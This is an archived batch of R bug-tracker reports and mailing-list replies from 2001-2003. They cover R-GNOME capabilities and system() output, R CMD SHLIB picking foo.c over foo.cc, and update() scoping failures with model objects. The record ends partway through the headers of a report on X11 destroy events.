X-Mailer: XFMail 1.4.7 on Linux
X-Priority: 3 (Normal)
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 8bit
MIME-Version: 1.0
In-Reply-To: <200205020922.LAA02927@pubhealth.ku.dk>
Date: Thu, 02 May 2002 12:32:10 +0200 (CEST)
Organization: International Agency for Research on Cancer
Sender: martyn@xena.iarc.fr
From: Martyn Plummer <plummer@iarc.fr>
To: ripley@stats.ox.ac.uk
Subject: Re: [Rd] R-GNOME (PR#1503)
Cc: R-bugs@biostat.ku.dk, r-devel@stat.math.ethz.ch

On 02-May-2002 ripley@stats.ox.ac.uk wrote:
> On Thu, 2 May 2002 gonin@genethon.fr wrote:
> 
>> Hi R colleagues,
>>
>> I don't know whether this is a bug, but something weird happen with R-GNOME.
>> Version 1.5.0.
>> I compiled the stuff under i-686 Linux RH 7.2 using ./configure
>> --with-gnome.
>> R can be started with or without the Gnome interface: fine.
>> However, when I start with Gnome interface, jpeg and a few other
>> things are unavailable (checked using capabilities()), whereas
>> everything is available (except Gnome) when I start R without Gnome.
> 
> Have you actually tried them?  capabilities() can be wrong, as it only
> reports what it is sure about.  For me under RH7.2 jpeg(), png() and X11()
> do all work under R --gui=gnome.  (Well, actually gnome has problems with
> its dialogs as it makes assumptions about the X11 system in use and I am
> not using XFree86.)
> 
> I will try to work out a more definitive algorithm for capabilities, but
> its main use is to test if checks should be run, so it needs to be
> conservative.  And as you note, Gnome is experimental and has a separate
> maintainer ....

jpeg() is available under the GNOME interface and works correctly.

>> Also, some calls seem available with Gnome: system("..") returns nothing.
>> Maybe this is related to the experimental nature of the Gnome interface.
>> Hope that helps.

The GNOME port currently uses the same version of do_system as the unix
command line port of R.  This sends the output of the system call to
the standard output.  So, for example, if you R-GNOME from a terminal,
the output will appear in the terminal and not the R GNOME console.
GNOME needs its own version of do_system.  I will fix this for R 1.5.1.

Martyn

==> 1503.audit <==
Tue May  7 09:09:09 2002	ripley	changed notes
Tue May  7 09:09:09 2002	ripley	foobar
Tue May  7 09:09:09 2002	ripley	moved from incoming to Misc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2644 *
Subject: R CMD SHLIB uses foo.c instead of foo.cc if both are present
From: faheem@email.unc.edu
Date: Sun, 16 Mar 2003 19:47:55 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2644 <==
From faheem@email.unc.edu Sun Mar 16 19:47:56 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h2GIltn9022825
	for <R-bugs@biostat.ku.dk>; Sun, 16 Mar 2003 19:47:56 +0100 (MET)
Date: Sun, 16 Mar 2003 19:47:55 +0100 (MET)
Message-Id: <200303161847.h2GIltn9022825@pubhealth.ku.dk>
From: faheem@email.unc.edu
To: R-bugs@biostat.ku.dk
Subject: R CMD SHLIB uses foo.c instead of foo.cc if both are present

Full_Name: Faheem Mitha
Version: 1.6.2
OS: Debian GNU/Linux
Submission from: (NULL) (209.42.199.193)


Suppose you are making a shared library using

R CMD SHLIB foo.cc

If there is a file called foo.c in the same directory, then it will be used
instead.

faheem ~/scratch/r-base>R CMD SHLIB foo.cc
gcc-3.0 -I/usr/lib/R/include   -D__NO_MATH_INLINES -mieee-fp  -fPIC  -g -O2
-c foo.c -o foo.o
g++-3.0 -shared  -o foo.so foo.o   -L/usr/lib/R/bin -lR

This has been rather annoying for me, because I sometimes write C and C++
versions of the same program side by side and so the files have the same
name except for the extensions. It should be possible to fix it, though I
don't understand the relevant scripts enough to suggest a patch.

Note this bug has also been reported by me as Debian bug #184969. You can access

this report via the web at
http://bugs.debian.org/cgi-bin/bugreport.cgi?archive=no&bug=184969

                                               Faheem.

==> 2644.followup.1 <==
From duncan@research.bell-labs.com Sun Mar 16 20:10:11 2003
Received: from dirty.research.bell-labs.com (ns1.research.bell-labs.com [204.178.16.6])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h2GJAAn9022924
	for <R-bugs@biostat.ku.dk>; Sun, 16 Mar 2003 20:10:11 +0100 (MET)
Received: from scummy.research.bell-labs.com (H-135-104-2-10.research.bell-labs.com [135.104.2.10])
	by dirty.research.bell-labs.com (8.12.8/8.12.8) with ESMTP id h2GJAAN5042506;
	Sun, 16 Mar 2003 14:10:10 -0500 (EST)
Received: from jessie.research.bell-labs.com (jessie.research.bell-labs.com [135.104.13.5])
	by scummy.research.bell-labs.com (8.12.8/8.12.8) with ESMTP id h2GJA3jt001825;
	Sun, 16 Mar 2003 14:10:03 -0500 (EST)
Received: from jessie.research.bell-labs.com (localhost [127.0.0.1])
	by jessie.research.bell-labs.com (8.12.8/8.12.8) with ESMTP id h2GJA31G027315;
	Sun, 16 Mar 2003 14:10:03 -0500 (EST)
Received: (from duncan@localhost)
	by jessie.research.bell-labs.com (8.12.8/8.12.8/Submit) id h2GJA287027314;
	Sun, 16 Mar 2003 14:10:02 -0500 (EST)
Date: Sun, 16 Mar 2003 14:10:02 -0500
From: Duncan Temple Lang <duncan@research.bell-labs.com>
To: faheem@email.unc.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] R CMD SHLIB uses foo.c instead of foo.cc if both are present (PR#2644)
Message-ID: <20030316141002.A26681@jessie.research.bell-labs.com>
Mail-Followup-To: Duncan Temple Lang <duncan@jessie.research.bell-labs.com>,
	faheem@email.unc.edu, r-devel@stat.math.ethz.ch,
	R-bugs@biostat.ku.dk
References: <200303161847.h2GIlvn9022829@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <200303161847.h2GIlvn9022829@pubhealth.ku.dk>; from faheem@email.unc.edu on Sun, Mar 16, 2003 at 07:47:57PM +0100

The "fix" is relatively simple. One can change the order of the
suffixes listed in $R_HOME/etc/Makeconf (i.e. the Makeconf.in version)
to alter the precedence. If one changes the line

 .SUFFIXES: .c .cc .cpp .C .d .f .lo .o

to place the '.c' after the '.cc', your example will work as you want it.

While the behavior is not desirable since you specified foo.cc on the
command line for R CMD SHLIB, I don't think it is a good idea to be
using files named x.c and x.cc in the same directory.  I would think
that this will lead to confusions with other tools and I can't think
of a context in which it is necessary.

 D.


faheem@email.unc.edu wrote:
> Full_Name: Faheem Mitha
> Version: 1.6.2
> OS: Debian GNU/Linux
> Submission from: (NULL) (209.42.199.193)
> 
> 
> Suppose you are making a shared library using
> 
> R CMD SHLIB foo.cc
> 
> If there is a file called foo.c in the same directory, then it will be used
> instead.
> 
> faheem ~/scratch/r-base>R CMD SHLIB foo.cc
> gcc-3.0 -I/usr/lib/R/include   -D__NO_MATH_INLINES -mieee-fp  -fPIC  -g -O2
> -c foo.c -o foo.o
> g++-3.0 -shared  -o foo.so foo.o   -L/usr/lib/R/bin -lR
> 
> This has been rather annoying for me, because I sometimes write C and C++
> versions of the same program side by side and so the files have the same
> name except for the extensions. It should be possible to fix it, though I
> don't understand the relevant scripts enough to suggest a patch.
> 
> Note this bug has also been reported by me as Debian bug #184969. You can access
> 
> this report via the web at
> http://bugs.debian.org/cgi-bin/bugreport.cgi?archive=no&bug=184969
> 
>                                                Faheem.
> 
> ______________________________________________
> R-devel@stat.math.ethz.ch mailing list
> https://www.stat.math.ethz.ch/mailman/listinfo/r-devel

-- 
_______________________________________________________________

Duncan Temple Lang                duncan@research.bell-labs.com
Bell Labs, Lucent Technologies    office: (908)582-3217
700 Mountain Avenue, Room 2C-259  fax:    (908)582-3340
Murray Hill, NJ  07974-2070       
         http://cm.bell-labs.com/stat/duncan

==> 2644.audit <==
Mon Mar 24 12:48:18 2003	ripley	moved from incoming to Misc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2645 *
Subject: Re: [Rd] R CMD SHLIB uses foo.c instead of foo.cc if both are present
From: Faheem Mitha <faheem@email.unc.edu>
Date: Sun, 16 Mar 2003 15:44:14 -0500 (EST)
--part of 2644
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2645 <==
From faheem@email.unc.edu Sun Mar 16 21:44:26 2003
Received: from smtp.intrex.net (smtp.intrex.net [209.42.192.250])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h2GKiPn9023335
	for <R-bugs@biostat.ku.dk>; Sun, 16 Mar 2003 21:44:25 +0100 (MET)
Received: from Chrestomanci [209.42.199.243] by smtp.intrex.net with ESMTP
  (SMTPD32-7.13) id A2204A58027A; Sun, 16 Mar 2003 15:44:16 -0500
Received: from faheem (helo=localhost)
	by Chrestomanci with local-esmtp (Exim 3.36 #1 (Debian))
	id 18uezO-0002RM-00; Sun, 16 Mar 2003 15:44:14 -0500
Date: Sun, 16 Mar 2003 15:44:14 -0500 (EST)
From: Faheem Mitha <faheem@email.unc.edu>
X-X-Sender: faheem@Chrestomanci
To: Duncan Temple Lang <duncan@research.bell-labs.com>
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] R CMD SHLIB uses foo.c instead of foo.cc if both are present
 (PR#2644)
In-Reply-To: <20030316141002.A26681@jessie.research.bell-labs.com>
Message-ID: <Pine.LNX.4.44.0303161534570.16046-100000@Chrestomanci>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
Sender: Faheem Mitha <faheem@email.unc.edu>
X-Declude-Sender: faheem@email.unc.edu [209.42.199.243]



On Sun, 16 Mar 2003, Duncan Temple Lang wrote:

> The "fix" is relatively simple. One can change the order of the
> suffixes listed in $R_HOME/etc/Makeconf (i.e. the Makeconf.in version)
> to alter the precedence. If one changes the line
>
>  .SUFFIXES: .c .cc .cpp .C .d .f .lo .o
>
> to place the '.c' after the '.cc', your example will work as you want it.

Just to clarify. Is this something that you (ie. R developers) are
planning to change, or are you just recommending that I change it? If so,
it will break on every upgrade. Wonder if I can put this in Makevars as a
local override, though...

Hmm. Perhaps using makefiles would be easier, really.

> While the behavior is not desirable since you specified foo.cc on the
> command line for R CMD SHLIB, I don't think it is a good idea to be
> using files named x.c and x.cc in the same directory.  I would think
> that this will lead to confusions with other tools and I can't think
> of a context in which it is necessary.

Mmm. Certainly not *necessary*. I still think it is a bug, though.

                                              Faheem.



==> 2645.audit <==
Mon Mar 24 12:49:14 2003	ripley	moved from incoming to Misc
Mon Mar 24 12:51:57 2003	ripley	changed notes
Mon Mar 24 12:51:57 2003	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2648 *
Subject: Re: [Rd] R CMD SHLIB uses foo.c instead of foo.cc if both are present
From: Kurt Hornik <hornik@ci.tuwien.ac.at>
Date: Mon, 17 Mar 2003 21:32:55 +0100
--part of 2644
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2648 <==
From hornik@ci.tuwien.ac.at Mon Mar 17 22:35:24 2003
Received: from mr.tuwien.ac.at (mr.tuwien.ac.at [128.130.2.10])
	by pubhealth.ku.dk (8.12.8/8.12.8) with ESMTP id h2HLZOn9006311
	for <R-bugs@biostat.ku.dk>; Mon, 17 Mar 2003 22:35:24 +0100 (MET)
Received: from mithrandir.hornik.net (mail@b206-178.dialin.tuwien.ac.at [128.131.206.178])
	by mr.tuwien.ac.at (8.12.8/8.12.8) with ESMTP id h2HLZBpa023910;
	Mon, 17 Mar 2003 22:35:14 +0100 (MET)
Received: from hornik by mithrandir.hornik.net with local (Exim 3.36 #1 (Debian))
	id 18v1Hz-0002QF-00; Mon, 17 Mar 2003 21:32:55 +0100
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15990.12535.257371.548411@mithrandir.hornik.net>
Date: Mon, 17 Mar 2003 21:32:55 +0100
To: faheem@email.unc.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] R CMD SHLIB uses foo.c instead of foo.cc if both are present
	(PR#2645)
In-Reply-To: <200303162044.h2GKiRn9023340@pubhealth.ku.dk>
References: <200303162044.h2GKiRn9023340@pubhealth.ku.dk>
X-Mailer: VM 7.11 under Emacs 21.2.1
Reply-To: Kurt.Hornik@wu-wien.ac.at
From: Kurt Hornik <hornik@ci.tuwien.ac.at>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)

>>>>> faheem  writes:

> On Sun, 16 Mar 2003, Duncan Temple Lang wrote:

>> The "fix" is relatively simple. One can change the order of the
>> suffixes listed in $R_HOME/etc/Makeconf (i.e. the Makeconf.in version)
>> to alter the precedence. If one changes the line
>> 
>> .SUFFIXES: .c .cc .cpp .C .d .f .lo .o
>> 
>> to place the '.c' after the '.cc', your example will work as you want it.

> Just to clarify. Is this something that you (ie. R developers) are
> planning to change, or are you just recommending that I change it? If
> so, it will break on every upgrade. Wonder if I can put this in
> Makevars as a local override, though...

> Hmm. Perhaps using makefiles would be easier, really.

It may be possible to work around this from your end using R CMD COMPILE
first and then calling R CMD SHLIB only for the linking part.

>> While the behavior is not desirable since you specified foo.cc on the
>> command line for R CMD SHLIB, I don't think it is a good idea to be
>> using files named x.c and x.cc in the same directory.  I would think
>> that this will lead to confusions with other tools and I can't think
>> of a context in which it is necessary.

> Mmm. Certainly not *necessary*. I still think it is a bug, though.

Actually, if you have foo.c and foo.cc in the same dir and compile these
for linking into a shared library they would both compile into foo.o ...

-k

==> 2648.audit <==
Mon Mar 24 12:49:14 2003	ripley	moved from incoming to Misc
Mon Mar 24 12:51:45 2003	ripley	changed notes
Mon Mar 24 12:51:45 2003	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Models

* PR# 1861 *
Subject: update() can not find objects
From: yzhou@arcturusag.com
Date: Thu, 1 Aug 2002 19:01:59 +0200 (MET DST)
--The problem is actually deeper than this.
--
--Sometime update() wants to evaluate arguments in the environment where the model
--was defined, as here. 
--
--Sometimes it wants to use the current environment, eg this snippet from MASS 
--ph.fun <- function(data, i) {
--  d <- data
--  d$calls <- d$fitted + d$res[i]
--  coef(update(fit, data=d))
--}
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1861 <==
From yzhou@arcturusag.com  Thu Aug  1 19:02:00 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA28213
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 19:01:59 +0200 (MET DST)
Date: Thu, 1 Aug 2002 19:01:59 +0200 (MET DST)
From: yzhou@arcturusag.com
Message-Id: <200208011701.TAA28213@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: update() can not find objects

Full_Name: Yi-Xiong Zhou
Version: 1.5.1
OS: win2000pro
Submission from: (NULL) (64.169.249.42)


Update() can not find objects when it is used in a function, which is in turn
being called by another function. Here is a R script to show the problem:

######## begin of the test script ##########
fun1 <- function() {
   x <- matrix(rnorm(500), 20,25)
   y <- rnorm(20)
   oo <- lm(y~x)
   print("step 1")
   update(oo)
   print("first update success.")
   fun2(oo)
}

fun2 <- function(gg) {
   update(gg)
   print("second update success.")
}

fun1()
########### end of the test script #############

Here is the result of running this script:

[1] "step 1"
[1] "first update success."
Error in eval(expr, envir, enclos) : Object "y" not found

Ideally, update should first search the objects in its environment first, then
its parent's, and grand parent's environments ... Right now, it only searchs its
own environment and the global environment, skipping its parents'. 


==> 1861.reply.1 <==
From p.dalgaard@biostat.ku.dk  Thu Aug  1 19:26:45 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA28287;
	Thu, 1 Aug 2002 19:26:44 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id g71HQaE08765;
	Thu, 1 Aug 2002 19:26:36 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: yzhou@arcturusag.com
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: update() can not find objects (PR#1861)
References: <200208011702.TAA28218@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 01 Aug 2002 19:26:34 +0200
In-Reply-To: <200208011702.TAA28218@pubhealth.ku.dk>
Message-ID: <x2ptx232yd.fsf@biostat.ku.dk>
Lines: 67
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

yzhou@arcturusag.com writes:

> Full_Name: Yi-Xiong Zhou
> Version: 1.5.1
> OS: win2000pro
> Submission from: (NULL) (64.169.249.42)
> 
> 
> Update() can not find objects when it is used in a function, which is in turn
> being called by another function. Here is a R script to show the problem:
> 
> ######## begin of the test script ##########
> fun1 <- function() {
>    x <- matrix(rnorm(500), 20,25)
>    y <- rnorm(20)
>    oo <- lm(y~x)
>    print("step 1")
>    update(oo)
>    print("first update success.")
>    fun2(oo)
> }
> 
> fun2 <- function(gg) {
>    update(gg)
>    print("second update success.")
> }
> 
> fun1()
> ########### end of the test script #############
> 
> Here is the result of running this script:
> 
> [1] "step 1"
> [1] "first update success."
> Error in eval(expr, envir, enclos) : Object "y" not found
> 
> Ideally, update should first search the objects in its environment first, then
> its parent's, and grand parent's environments ... Right now, it only searchs its
> own environment and the global environment, skipping its parents'. 

No, that's not what you should expect in a language with lexical scoping. 


However, there might still be a bug, since update with a non-missing
formula argument would extract the formula environment from the
formula stored in the lm object, but that doesn't happen if it is
missing. Modifying fun2 to

function(gg) {
   update(gg,formula(gg))
   print("second update success.")
}

or even

function(gg) {
   update(gg,y~x)
   print("second update success.")
}

does allow your example to run, which is somewhat unexpected...

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1861.followup.1 <==
From yzhou@arcturusag.com  Thu Aug  1 19:58:40 2002
Received: from genome.arcturusag.com (mail.arcturusag.com [64.169.249.254])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id TAA28377;
	Thu, 1 Aug 2002 19:58:39 +0200 (MET DST)
Received: by GENOME with Internet Mail Service (5.5.2650.21)
	id <P7TL2JNV>; Thu, 1 Aug 2002 10:53:32 -0700
Message-ID: <BBAF0DEC119BD41193C100B0D0788DFE1D234B@GENOME>
From: Yi-Xiong Zhou <yzhou@arcturusag.com>
To: "'Peter Dalgaard BSA'" <p.dalgaard@biostat.ku.dk>
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: RE: update() can not find objects (PR#1861)
Date: Thu, 1 Aug 2002 10:53:31 -0700 
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain

Thanks Peter. This does work for formula. However, it failed to a function
call. Here is another test script:

################# begin test ###############
fun1 <- function() {
   x <- matrix(rnorm(500), 20,25)
   oo <- fun3(x)
   print("step 1")
   update(oo)
   print("first update success.")
   fun2(oo)
}

fun2 <- function(gg) {
   update(gg)
   print("second update success.")
}

fun3 <- function(aa) {
   oo <- list(x=aa, call=match.call())
   oo
}

fun1()
############### end test ############

The error message is 

[1] "step 1"
[1] "first update success."
Error in fun3(aa = x) : Object "x" not found

Yi-Xiong


-----Original Message-----
From: Peter Dalgaard BSA [mailto:p.dalgaard@biostat.ku.dk]
Sent: Thursday, August 01, 2002 10:27 AM
To: Yi-Xiong Zhou
Cc: r-devel@stat.math.ethz.ch; R-bugs@biostat.ku.dk
Subject: Re: update() can not find objects (PR#1861)


yzhou@arcturusag.com writes:

> Full_Name: Yi-Xiong Zhou
> Version: 1.5.1
> OS: win2000pro
> Submission from: (NULL) (64.169.249.42)
> 
> 
> Update() can not find objects when it is used in a function, which is in
turn
> being called by another function. Here is a R script to show the problem:
> 
> ######## begin of the test script ##########
> fun1 <- function() {
>    x <- matrix(rnorm(500), 20,25)
>    y <- rnorm(20)
>    oo <- lm(y~x)
>    print("step 1")
>    update(oo)
>    print("first update success.")
>    fun2(oo)
> }
> 
> fun2 <- function(gg) {
>    update(gg)
>    print("second update success.")
> }
> 
> fun1()
> ########### end of the test script #############
> 
> Here is the result of running this script:
> 
> [1] "step 1"
> [1] "first update success."
> Error in eval(expr, envir, enclos) : Object "y" not found
> 
> Ideally, update should first search the objects in its environment first,
then
> its parent's, and grand parent's environments ... Right now, it only
searchs its
> own environment and the global environment, skipping its parents'. 

No, that's not what you should expect in a language with lexical scoping. 


However, there might still be a bug, since update with a non-missing
formula argument would extract the formula environment from the
formula stored in the lm object, but that doesn't happen if it is
missing. Modifying fun2 to

function(gg) {
   update(gg,formula(gg))
   print("second update success.")
}

or even

function(gg) {
   update(gg,y~x)
   print("second update success.")
}

does allow your example to run, which is somewhat unexpected...

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1861.followup.2 <==
From tlumley@u.washington.edu  Thu Aug  1 21:37:37 2002
Received: from mxout2.cac.washington.edu (mxout2.cac.washington.edu [140.142.33.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA28674
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 21:37:36 +0200 (MET DST)
Received: from mailscan-out3.cac.washington.edu (mailscan-out3.cac.washington.edu [140.142.32.18])
	by mxout2.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.06) with SMTP id g71Jasej008354
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 12:36:54 -0700
Received: FROM homer26.u.washington.edu BY mailscan-out3.cac.washington.edu ; Thu Aug 01 12:36:52 2002 -0700
Received: from localhost (tlumley@localhost)
	by homer26.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g71Jap8T071380;
	Thu, 1 Aug 2002 12:36:51 -0700
Date: Thu, 1 Aug 2002 12:36:51 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: yzhou@arcturusag.com
cc: r-devel@stat.math.ethz.ch, <R-bugs@biostat.ku.dk>
Subject: Re: update() can not find objects (PR#1861)
In-Reply-To: <200208011702.TAA28218@pubhealth.ku.dk>
Message-ID: <Pine.A41.4.44.0208011232100.18384-100000@homer26.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 1 Aug 2002 yzhou@arcturusag.com wrote:
<snip>
> Ideally, update should first search the objects in its environment first, then
> its parent's, and grand parent's environments ... Right now, it only searchs its
> own environment and the global environment, skipping its parents'.
>

No, ideally it should search the objects in the environment where the
model was defined.  There's no guarantee that this is a grandparent, and
grandparents shouldn't be searched otherwise.  It might be tricky to get
this to work.

What isn't clear to me is whether the current environment should be
searched before the environment where the model was defined or afterwards.

	-thomas


==> 1861.followup.3 <==
From tlumley@u.washington.edu  Thu Aug  1 23:14:46 2002
Received: from mxout2.cac.washington.edu (mxout2.cac.washington.edu [140.142.33.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA28971
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 23:14:45 +0200 (MET DST)
Received: from mailscan-out2.cac.washington.edu (mailscan-out2.cac.washington.edu [140.142.33.17])
	by mxout2.cac.washington.edu (8.12.1+UW01.12/8.12.1+UW02.06) with SMTP id g71LE4ej008711
	for <R-bugs@biostat.ku.dk>; Thu, 1 Aug 2002 14:14:04 -0700
Received: FROM homer26.u.washington.edu BY mailscan-out2.cac.washington.edu ; Thu Aug 01 14:14:00 2002 -0700
Received: from localhost (tlumley@localhost)
	by homer26.u.washington.edu (8.12.1+UW01.12/8.12.1+UW02.01) with ESMTP id g71LDx4S055014;
	Thu, 1 Aug 2002 14:14:00 -0700
Date: Thu, 1 Aug 2002 14:13:59 -0700 (PDT)
From: Thomas Lumley <tlumley@u.washington.edu>
To: Yi-Xiong Zhou <yzhou@arcturusag.com>
cc: "'Peter Dalgaard BSA'" <p.dalgaard@biostat.ku.dk>,
        <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: RE: update() can not find objects (PR#1861)
In-Reply-To: <BBAF0DEC119BD41193C100B0D0788DFE1D234B@GENOME>
Message-ID: <Pine.A41.4.44.0208011405170.18384-100000@homer26.u.washington.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 1 Aug 2002, Yi-Xiong Zhou wrote:

> Thanks Peter. This does work for formula. However, it failed to a function
> call. Here is another test script:
>
> ################# begin test ###############
> fun1 <- function() {
>    x <- matrix(rnorm(500), 20,25)
>    oo <- fun3(x)
>    print("step 1")
>    update(oo)
>    print("first update success.")
>    fun2(oo)
> }
>
> fun2 <- function(gg) {
>    update(gg)
>    print("second update success.")
> }
>
> fun3 <- function(aa) {
>    oo <- list(x=aa, call=match.call())
>    oo
> }
>
> fun1()
> ############### end test ############
>
> The error message is
>
> [1] "step 1"
> [1] "first update success."
> Error in fun3(aa = x) : Object "x" not found

Yes, but this isn't supposed to work, and can't.

In the first place update() is supposed to work on models, not on
arbitrary objects.

In the second place, the object you are returning contains no information
about where it was created, so it's not possible for update to work out
the correct environment.  In this case the correct environment happens to
be parent.frame(2), but there's no reason why this should be true in
general.


When the object is a model with a formula it does carry information about
where it was defined, so update() can look there.  Your first example
should have worked, and the fact that it didn't is a bug (though arguably
just a wishlist bug).  This new example shouldn't work.


	-thomas



==> 1861.followup.4 <==
From yzhou@arcturusag.com  Thu Aug  1 23:25:31 2002
Received: from genome.arcturusag.com (mail.arcturusag.com [64.169.249.254])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA29028;
	Thu, 1 Aug 2002 23:25:29 +0200 (MET DST)
Received: by GENOME with Internet Mail Service (5.5.2650.21)
	id <P7TL2JPY>; Thu, 1 Aug 2002 14:20:22 -0700
Message-ID: <BBAF0DEC119BD41193C100B0D0788DFE1D234C@GENOME>
From: Yi-Xiong Zhou <yzhou@arcturusag.com>
To: "'Thomas Lumley'" <tlumley@u.washington.edu>
Cc: "'Peter Dalgaard BSA'" <p.dalgaard@biostat.ku.dk>,
        r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: RE: update() can not find objects (PR#1861)
Date: Thu, 1 Aug 2002 14:20:13 -0700 
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2650.21)
Content-Type: text/plain

Could an object carry the information about where it was created? Could that
be on the wish list? 

Yi-Xiong

-----Original Message-----
From: Thomas Lumley [mailto:tlumley@u.washington.edu]
Sent: Thursday, August 01, 2002 2:14 PM
To: Yi-Xiong Zhou
Cc: 'Peter Dalgaard BSA'; r-devel@stat.math.ethz.ch;
R-bugs@biostat.ku.dk
Subject: RE: update() can not find objects (PR#1861)


On Thu, 1 Aug 2002, Yi-Xiong Zhou wrote:

> Thanks Peter. This does work for formula. However, it failed to a function
> call. Here is another test script:
>
> ################# begin test ###############
> fun1 <- function() {
>    x <- matrix(rnorm(500), 20,25)
>    oo <- fun3(x)
>    print("step 1")
>    update(oo)
>    print("first update success.")
>    fun2(oo)
> }
>
> fun2 <- function(gg) {
>    update(gg)
>    print("second update success.")
> }
>
> fun3 <- function(aa) {
>    oo <- list(x=aa, call=match.call())
>    oo
> }
>
> fun1()
> ############### end test ############
>
> The error message is
>
> [1] "step 1"
> [1] "first update success."
> Error in fun3(aa = x) : Object "x" not found

Yes, but this isn't supposed to work, and can't.

In the first place update() is supposed to work on models, not on
arbitrary objects.

In the second place, the object you are returning contains no information
about where it was created, so it's not possible for update to work out
the correct environment.  In this case the correct environment happens to
be parent.frame(2), but there's no reason why this should be true in
general.


When the object is a model with a formula it does carry information about
where it was defined, so update() can look there.  Your first example
should have worked, and the fact that it didn't is a bug (though arguably
just a wishlist bug).  This new example shouldn't work.


	-thomas


==> 1861.audit <==
Thu Aug  1 23:00:21 2002	thomas	moved from incoming to Models
Fri Aug  2 00:01:23 2002	thomas	changed notes
Fri Aug  2 00:01:23 2002	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Startup

none

Directory:  System-specific

* PR# 848 *
Subject: X11 device doesn't handle destroy events correcly
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 13 Feb 2001 17:40:46 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 848 <==
From postmaster@franz.stat.wisc.edu  Tue Feb 13 23:40:36 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA10552
	for <r-bugs@biostat.ku.dk>; Tue, 13 Feb 2001 23:40:36 +0100 (MET)
Received: from infiniti.ece.cmu.edu (really [128.2.133.84]) by franz.stat.wisc.edu
	via in.smtpd with esmtp
	id <m14So7r-000J2mC@franz.stat.wisc.edu> (Debian Smail3.2.0.102)
	for <r-bugs@r-project.org>; Tue, 13 Feb 2001 16:40:47 -0600 (CST) 
Received: (from tov@localhost) by infiniti.ece.cmu.edu (AIX4.3/UCB 8.8.8/8.8.8) id RAA70658; Tue, 13 Feb 2001 17:40:46 -0500
